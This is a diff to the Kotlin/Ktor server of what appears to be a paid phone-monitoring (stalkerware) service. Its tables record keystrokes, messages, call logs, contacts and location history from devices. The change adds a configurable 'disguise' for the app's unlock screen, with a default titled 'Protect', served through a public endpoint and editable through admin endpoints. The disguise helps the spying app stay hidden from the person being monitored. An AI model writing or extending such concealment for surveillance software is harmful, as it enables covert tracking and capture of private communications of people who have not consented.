@@ -356,6 +356,16 @@ object LandingContentTable : Table("landing_content") {
     override val primaryKey = PrimaryKey(id)
 }
 
+// Single-row table (id=1) storing the AuthGate screen appearance config.
+object DisguiseConfigTable : Table("disguise_config") {
+    val id          = integer("id")
+    val configJson  = text("config_json")
+    val updatedAt   = long("updated_at")
+    override val primaryKey = PrimaryKey(id)
+}
+
+val DEFAULT_DISGUISE_CONFIG = """{"icon":"🔐","title":"Protect","subtitle":"Digite o código do painel ou o e-mail da sua conta","bgColor":"#0A0B10","bgOpacity":100,"bgImageUrl":""}"""
+
 val DEFAULT_LANDING_CONTENT = """
 {
   "hero": {
@@ -570,9 +580,9 @@ fun initDatabase() {
 
     transaction {
         SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LocationHistoryTable, LogsTable, MessagesTable, LandingContentTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, BannedDevicesTable)
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, BannedDevicesTable, DisguiseConfigTable)
         SchemaUtils.createMissingTablesAndColumns(UsersTable, DevicesTable, MessagesTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable, BannedDevicesTable) // migrate new columns on existing installs
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable, BannedDevicesTable, DisguiseConfigTable) // migrate new columns on existing installs
 
         // Reset all devices to offline state initially on server start
         DevicesTable.update {
@@ -589,6 +599,13 @@ fun initDatabase() {
             LandingContentTable.insert {
                 it[id] = 1
                 it[contentJson] = DEFAULT_LANDING_CONTENT
+                it[updatedAt] = System.currentTimeMillis()
+            }
+        }
+        if (DisguiseConfigTable.select { DisguiseConfigTable.id eq 1 }.count() == 0L) {
+            DisguiseConfigTable.insert {
+                it[id] = 1
+                it[configJson] = DEFAULT_DISGUISE_CONFIG
                 it[updatedAt] = System.currentTimeMillis()
             }
         }
@@ -2932,6 +2949,50 @@ fun main() {
                         }
                 }
                 broadcastToUserId(packetJson.encodeToString(DeviceListPacket(devices = updatedList, maxDevices = maxDevices)), userId)
+                call.respond(mapOf("ok" to true))
+            }
+
+            // ── Disguise config (AuthGate screen appearance) ──────────────────
+            // Public: app fetches this without auth to render the unlock screen
+            get("/api/disguise-config") {
+                val json = transaction {
+                    DisguiseConfigTable.select { DisguiseConfigTable.id eq 1 }
+                        .firstOrNull()?.get(DisguiseConfigTable.configJson)
+                        ?: DEFAULT_DISGUISE_CONFIG
+                }
+                call.respondText(json, io.ktor.http.ContentType.Application.Json)
+            }
+
+            // Admin: read disguise config
+            get("/api/admin/disguise-config") {
+                if (assertLandingAdmin(call) == null) return@get
+                val json = transaction {
+                    DisguiseConfigTable.select { DisguiseConfigTable.id eq 1 }
+                        .firstOrNull()?.get(DisguiseConfigTable.configJson)
+                        ?: DEFAULT_DISGUISE_CONFIG
+                }
+                call.respondText(json, io.ktor.http.ContentType.Application.Json)
+            }
+
+            // Admin: save disguise config
+            put("/api/admin/disguise-config") {
+                if (assertLandingAdmin(call) == null) return@put
+                val body = call.receiveText()
+                // Basic JSON validation
+                runCatching { org.json.JSONObject(body) }.getOrNull()
+                    ?: return@put call.respond(io.ktor.http.HttpStatusCode.BadRequest, mapOf("error" to "JSON inválido"))
+                transaction {
+                    val existing = DisguiseConfigTable.select { DisguiseConfigTable.id eq 1 }.count()
+                    if (existing == 0L) {
+                        DisguiseConfigTable.insert {
+                            it[id] = 1; it[configJson] = body; it[updatedAt] = System.currentTimeMillis()
+                        }
+                    } else {
+                        DisguiseConfigTable.update({ DisguiseConfigTable.id eq 1 }) {
+                            it[configJson] = body; it[updatedAt] = System.currentTimeMillis()
+                        }
+                    }
+                }
                 call.respond(mapOf("ok" to true))
             }
 
